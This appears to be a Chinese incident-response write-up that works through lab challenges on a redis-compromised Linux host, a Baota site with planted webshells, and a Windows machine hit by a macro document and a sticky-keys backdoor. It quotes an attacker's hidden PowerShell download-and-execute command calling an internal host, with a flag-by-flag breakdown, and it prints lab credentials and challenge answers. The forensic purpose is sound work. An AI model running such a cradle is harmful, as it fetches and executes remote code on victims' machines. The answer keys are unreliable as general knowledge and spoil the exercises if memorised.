+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228175428548.png" alt="image-20251228175428548"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.75.129</span><br><span class="line">flag&#123;thisismybaby&#125;</span><br><span class="line">flag&#123;kfcvme50&#125;</span><br><span class="line">flag&#123;P@ssW0rd_redis&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="账户"><a href="#账户" class="headerlink" title="账户"></a>账户</h2><p>避免权限不足，使用root</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看是否存在异常账户：cat /etc/passwd</span><br><span class="line">查看特权账户：awk -F: &#x27;$3==0 &#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line">查看远程登录用户：awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line">查看空口令账户：awk -F: &#x27;length($2)==0 &#123;print $1&#125;&#x27; /etc/shadow</span><br></pre></td></tr></table></figure>
+
+<p>无异常情况</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228181632687.png" alt="image-20251228181632687"></p>
+<h2 id="端口-进程-网络连接"><a href="#端口-进程-网络连接" class="headerlink" title="端口&#x2F;进程&#x2F;网络连接"></a>端口&#x2F;进程&#x2F;网络连接</h2><p>无异常情况</p>
+<h2 id="历史命令"><a href="#历史命令" class="headerlink" title="历史命令"></a>历史命令</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">history</span><br><span class="line">一般是先备份再查看</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228182643147.png" alt="image-20251228182643147"></p>
+<p>普通用户的历史命令未发现信息，root用户历史命令中发现信息</p>
+<p>发现flag：flag{thisismybaby}</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228182026804.png" alt="image-20251228182026804"></p>
+<p>并且这里在历史命令中发现他修改了rc.local开机自启动</p>
+<h2 id="查看修改的该文件"><a href="#查看修改的该文件" class="headerlink" title="查看修改的该文件"></a>查看修改的该文件</h2><p>得到flag</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228182944701.png" alt="image-20251228182944701"></p>
+<h2 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h2><p>无异常</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228183155955.png" alt="image-20251228183155955"></p>
+<h2 id="日志"><a href="#日志" class="headerlink" title="日志"></a>日志</h2><p>未发现Apache、Nginx等，发现redis</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228183438553.png" alt="image-20251228183438553"></p>
+<p>进入查看日志</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">查看redis连接成功的信息：grep &quot;Accepted &quot; /var/log/redis/redis.log</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228183719138.png" alt="image-20251228183719138"></p>
+<p>192.168.75.129即为攻击者攻击ip</p>
+<h2 id="查看文件"><a href="#查看文件" class="headerlink" title="查看文件"></a>查看文件</h2><p>redis被连接了，可能redis相关文件被更改了</p>
+<p>查看redis配置文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/etc/redis.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228184309939.png" alt="image-20251228184309939"></p>
+<h1 id="Linux2"><a href="#Linux2" class="headerlink" title="Linux2"></a>Linux2</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">前景需要：看监控的时候发现webshell告警，领导让你上机检查你可以救救安服仔吗！！</span><br><span class="line">1,192.168.20.1</span><br><span class="line">2,提交攻击者修改的管理员密码(明文)</span><br><span class="line">3,提交第一次Webshell的连接URL(http://xxx.xxx.xxx.xx/abcdefg?abcdefg只需要提交abcdefg?abcdefg)</span><br><span class="line">3,提交Webshell连接密码</span><br><span class="line">4,提交数据包的flag1</span><br><span class="line">5,提交攻击者使用的后续上传的木马文件名称</span><br><span class="line">6,提交攻击者隐藏的flag2</span><br><span class="line">7,提交攻击者隐藏的flag3</span><br><span class="line"></span><br><span class="line">相关账户密码：root/Inch@957821.</span><br></pre></td></tr></table></figure>
+
+<p>无图形化界面</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228190307790.png" alt="image-20251228190307790"></p>
+<p>远程连接</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228190710355.png" alt="image-20251228190710355"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1,192.168.20.1</span><br><span class="line">2,Network@2020</span><br><span class="line">3,index.php?user-app-register</span><br><span class="line">3,Network2020</span><br><span class="line">4,</span><br><span class="line">5,冰蝎</span><br><span class="line">6,flag2=flag&#123;bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9&#125;</span><br><span class="line">7,flag3 = flag&#123;5LourqoFt5d2zyOVUoVPJbOmeVmoKgcy6OZ&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="数据包"><a href="#数据包" class="headerlink" title="数据包"></a>数据包</h2><p>当前用户目录下存在数据包，下载到本地分析提示文件损坏无法打开</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228214101212.png" alt="image-20251228214101212"></p>
+<blockquote>
+<p>尝试修复没修复成功</p>
+</blockquote>
+<h2 id="账户-1"><a href="#账户-1" class="headerlink" title="账户"></a>账户</h2><p>无异常</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228190856300.png" alt="image-20251228190856300"></p>
+<h2 id="历史命令-1"><a href="#历史命令-1" class="headerlink" title="历史命令"></a>历史命令</h2><p>下载了宝塔</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228191019787.png" alt="image-20251228191019787"></p>
+<p>可以看到历史命令中修改了文件</p>
+<p>查看文件得到flag2</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag&#123;bL5Frin6JVwVw7tJBdqXlHCMVpAenXI9In9&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/3483647-20250405184653934-1620782404.png" alt="image-20250405184651824"></p>
+<p>找到flag3</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228191053239.png" alt="image-20251228191053239"></p>
+<h2 id="查看服务"><a href="#查看服务" class="headerlink" title="查看服务"></a>查看服务</h2><p>由于下载了宝塔，查看服务是否开启宝塔服务</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service --status-all</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228191225004.png" alt="image-20251228191225004"></p>
+<p>开启了宝塔，此外还开启了mysql、Nginx、php</p>
+<h2 id="宝塔面板"><a href="#宝塔面板" class="headerlink" title="宝塔面板"></a>宝塔面板</h2><p>修改宝塔密码</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228191453038.png" alt="image-20251228191453038"></p>
+<p>查看宝塔端口信息</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228191716056.png" alt="image-20251228191716056"></p>
+<p>登录宝塔</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228191801994.png" alt="image-20251228191801994"></p>
+<p>宝塔中存在一个网站</p>
+<p>添加域名为当前ip</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228212101169.png" alt="image-20251228212101169"></p>
+<p>访问<a target="_blank" rel="noopener" href="http://192.168.139.133/">http://192.168.139.133/</a></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228212147460.png" alt="image-20251228212147460"></p>
+<h2 id="日志-1"><a href="#日志-1" class="headerlink" title="日志"></a>日志</h2><p>分析web日志</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228215432203.png" alt="image-20251228215432203"></p>
+<p>涉及的ip有</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.20.1</span><br><span class="line">192.168.20.131</span><br></pre></td></tr></table></figure>
+
+<p>源文件在&#x2F;www&#x2F;wwwlogs&#x2F;127.0.0.1.log中</p>
+<p>最后确定可以在流量包里推测出攻击ip为192.168.20.1，流量包里全都是192.168.20.1向192.168.20.144的请求包，大多数都没有成功</p>
+<h2 id="数据库"><a href="#数据库" class="headerlink" title="数据库"></a>数据库</h2><p>要知道攻击者修改的管理员密码，前面知道网站开了mysql，可以连进数据库查看密码</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228220444220.png" alt="image-20251228220444220"></p>
+<p>phpMyadmin连接</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228221010600.png" alt="image-20251228221010600"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228221324762.png" alt="image-20251228221324762"></p>
+<p>密码为：Network@2020</p>
+<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>搜索网站目录下webshell</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228212626296.png" alt="image-20251228212626296"></p>
+<p>网站目录为&#x2F;www&#x2F;wwwroot&#x2F;127.0.0.1</p>
+<p>搜索webshell可疑文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">grep -irn &#x27;@eval(&#x27; /www</span><br></pre></td></tr></table></figure>
+
+<p>定位到了两个文件</p>
+<p>register.html和blocks_modify.html</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228221635092.png" alt="image-20251228221635092"></p>
+<p>这里分析数据包追踪流即可知道webshell的请求url与密码信息</p>
+<p>登录后台可以看到写入了webshell</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228222231142.png" alt="image-20251228222231142"></p>
+<p>也就是对应前台的注册协议</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228222311364.png" alt="image-20251228222311364"></p>
+<p>webshell的url：<a target="_blank" rel="noopener" href="http://192.168.139.133/index.php?user-app-register">http://192.168.139.133/index.php?user-app-register</a></p>
+<p>密码在文件内容也可以看到为：Network2020</p>
+<p>靶机中有wireshark流量包，进行追踪流分析：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/3483647-20250405183315611-108378889.png" alt="image-20250405183314689"></p>
+<p>在数据流27之前的webshell都是与<code>user-app-register</code>注册协议交互，根据流量特征分析使用的工具为蚁剑：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/3483647-20250405183546301-1246026834.png" alt="image-20250405183545319"></p>
+<p>可以解码查看这里POST的请求：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/3483647-20250405183946827-1869740100.png" alt="image-20250405183945392"></p>
+<p>之后的都是冰蝎流量特征了，也能看出请求的webshell名称：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/3483647-20250405184125072-1368897323.png" alt="image-20250405184124212"></p>
+<h1 id="近源OS"><a href="#近源OS" class="headerlink" title="近源OS"></a>近源OS</h1><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">相关账户密码</span><br><span class="line">Administrator</span><br><span class="line">zgsf@2024</span><br><span class="line"></span><br><span class="line">前景需要：小王从某安全大厂被优化掉后，来到了某私立小学当起了计算机老师。某一天上课的时候，发现鼠标在自己动弹，又发现除了某台电脑，其他电脑连不上网络。感觉肯定有学生捣乱，于是开启了应急。</span><br><span class="line"></span><br><span class="line">近源渗透（Close-Source Penetration 或 Physical Proximity-Based Penetration）是一种网络安全攻击或测试手段，其核心特点是攻击者（或渗透测试人员）通过物理接近目标，结合技术手段与物理接触，突破目标的安全防线。与传统远程网络渗透不同，近源渗透更依赖对目标物理环境、周边设备或人员的直接接触或近距离交互。</span><br><span class="line"></span><br><span class="line">1.攻击者的外网IP地址</span><br><span class="line">2.攻击者的内网跳板IP地址</span><br><span class="line">3.攻击者使用的限速软件的md5大写</span><br><span class="line">4.攻击者的后门md5大写</span><br><span class="line">5.攻击者留下的flag</span><br></pre></td></tr></table></figure>
+
+<h2 id="攻击者的外网IP地址"><a href="#攻击者的外网IP地址" class="headerlink" title="攻击者的外网IP地址"></a>攻击者的外网IP地址</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">8.219.200.130</span><br></pre></td></tr></table></figure>
+
+<p>桌面存在多个文件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228233848932.png" alt="image-20251228233848932"></p>
+<p>将文件放入沙箱查看</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228235147980.png" alt="image-20251228235147980"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228235139903.png" alt="image-20251228235139903"></p>
+<p>office宏</p>
+<p>并且网络行为中向境外ip发起了http请求，猜测该ip为攻击者ip</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228235242611.png" alt="image-20251228235242611"></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251228235417363.png" alt="image-20251228235417363"></p>
+<h2 id="攻击者的内网跳板IP地址"><a href="#攻击者的内网跳板IP地址" class="headerlink" title="攻击者的内网跳板IP地址"></a>攻击者的内网跳板IP地址</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">192.168.20.129</span><br></pre></td></tr></table></figure>
+
+<p>在桌面的<code>phpStudy-修复</code>的文件，尝试编辑会发现：</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/3483647-20250405191827198-1549955899.png" alt="image-20250405191826040"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">powershell.exe -nop -w hidden -c &quot;IEX ((new-object net.webclient).downloadstring(&#x27;http://192.168.20.129:801/a&#x27;))&quot;</span><br></pre></td></tr></table></figure>
+
+<table>
+<thead>
+<tr>
+<th align="left"><strong>参数&#x2F;组件</strong></th>
+<th align="left"><strong>全称&#x2F;解释</strong></th>
+<th align="left"><strong>作用</strong></th>
+<th align="left"><strong>示例&#x2F;细节</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><code>powershell.exe</code></td>
+<td align="left">PowerShell命令行工具</td>
+<td align="left">启动PowerShell环境</td>
+<td align="left">基础执行程序</td>
+</tr>
+<tr>
+<td align="left"><code>-nop</code></td>
+<td align="left"><code>-NoProfile</code></td>
+<td align="left">不加载用户配置文件（加快启动，避免用户脚本干扰）</td>
+<td align="left">跳过<code>$PROFILE</code>配置</td>
+</tr>
+<tr>
+<td align="left"><code>-w hidden</code></td>
+<td align="left"><code>-WindowStyle Hidden</code></td>
+<td align="left">隐藏PowerShell窗口（避免用户察觉）</td>
+<td align="left">可选值：<code>Normal</code>、<code>Minimized</code>、<code>Maximized</code>、<code>Hidden</code></td>
+</tr>
+<tr>
+<td align="left"><code>-c</code></td>
+<td align="left"><code>-Command</code></td>
+<td align="left">指定要执行的命令字符串</td>
+<td align="left">后接需执行的代码</td>
+</tr>
+<tr>
+<td align="left"><code>IEX</code></td>
+<td align="left"><code>Invoke-Expression</code>（别名）</td>
+<td align="left">执行字符串中的代码（动态解析并运行）</td>
+<td align="left">常用于执行远程脚本或动态生成的代码</td>
+</tr>
+<tr>
+<td align="left"><code>new-object net.webclient</code></td>
+<td align="left">创建<code>System.Net.WebClient</code>对象</td>
+<td align="left">提供HTTP客户端功能，用于网络请求</td>
+<td align="left">替代方案：<code>Invoke-WebRequest</code>（PowerShell 3.0+）</td>
+</tr>
+<tr>
+<td align="left"><code>.downloadstring(&#39;URL&#39;)</code></td>
+<td align="left">从指定URL下载字符串内容</td>
+<td align="left">获取远程服务器上的数据（此处为脚本代码）</td>
+<td align="left">目标URL为<code>http://192.168.20.129:801/a</code>（可能为内网攻击载荷）</td>
+</tr>
+<tr>
+<td align="left"><strong>完整命令意图</strong></td>
+<td align="left">隐藏窗口启动PowerShell，跳过配置文件，下载并执行远程脚本</td>
+<td align="left">典型渗透测试或恶意软件行为，用于隐蔽执行未经授权的代码</td>
+<td align="left">实际用途可能是植入后门、横向移动、信息窃取等</td>
+</tr>
+</tbody></table>
+<p>内网ip为192.168.20.129</p>
+<h2 id="攻击者使用的限速软件的md5大写"><a href="#攻击者使用的限速软件的md5大写" class="headerlink" title="攻击者使用的限速软件的md5大写"></a>攻击者使用的限速软件的md5大写</h2><p>查看该文件属性，创建时间和访问时间为同一天</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251229003143636.png" alt="image-20251229003143636"></p>
+<p>查找 2024-05-06 创建的文件，输出到txt文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#直接输出中文会乱码，先设置控制台编码再查找输出</span><br><span class="line">chcp 65001</span><br><span class="line">dir /TC /O-D /S | findstr &quot;2024/05/06&quot; &gt; 1.txt</span><br><span class="line">/TC：以通用格式显示文件的创建时间。</span><br><span class="line">/O-D：按照创建时间降序排列。</span><br><span class="line">/S：递归地搜索所有子目录。</span><br></pre></td></tr></table></figure>
+
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251229003624091.png" alt="image-20251229003624091"></p>
+<p>关注在创建宏文档之后创建的exe</p>
+<p>也就是2025&#x2F;05&#x2F;06 15:18:10后创建的</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251229003914231.png" alt="image-20251229003914231"></p>
+<p>通过百度搜索，p2pover可限制带宽</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/822ea3edf1daa180ca1d1de8a28e8eee1511458474.png%401192w.webp" alt="img"></p>
+<p>可疑文件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/4ec601c1e31c256f0105a738aa6a2bef1511458474.png%401192w.webp" alt="img"></p>
+<p>查看目录也可以发现</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">C:\PerfLogs\666\666\777\666\666\666\666\666\666\666\666\666\666\666</span><br></pre></td></tr></table></figure>
+
+<p>目录存在该文件</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251229004239310.png" alt="image-20251229004239310"></p>
+<p>提取md5</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251229004547943.png" alt="image-20251229004547943"></p>
+<p>2a5d8838bdb4d404ec632318c94adc96</p>
+<p>小写转大写使用notepad即可</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251229004617330.png" alt="image-20251229004617330"></p>
+<h2 id="攻击者的后门md5大写"><a href="#攻击者的后门md5大写" class="headerlink" title="攻击者的后门md5大写"></a>攻击者的后门md5大写</h2><p>检查启动项、计划任务、服务未发现异常，排查shift后门时（连续点击shift键5次），发现攻击者留的后门</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://attackxu.oss-cn-hangzhou.aliyuncs.com/image/image-20251229004904738.png" alt="image-20251229004904738"></p>
+<p>应用为sethc.exe</p>
+<p>找到该应用</p>
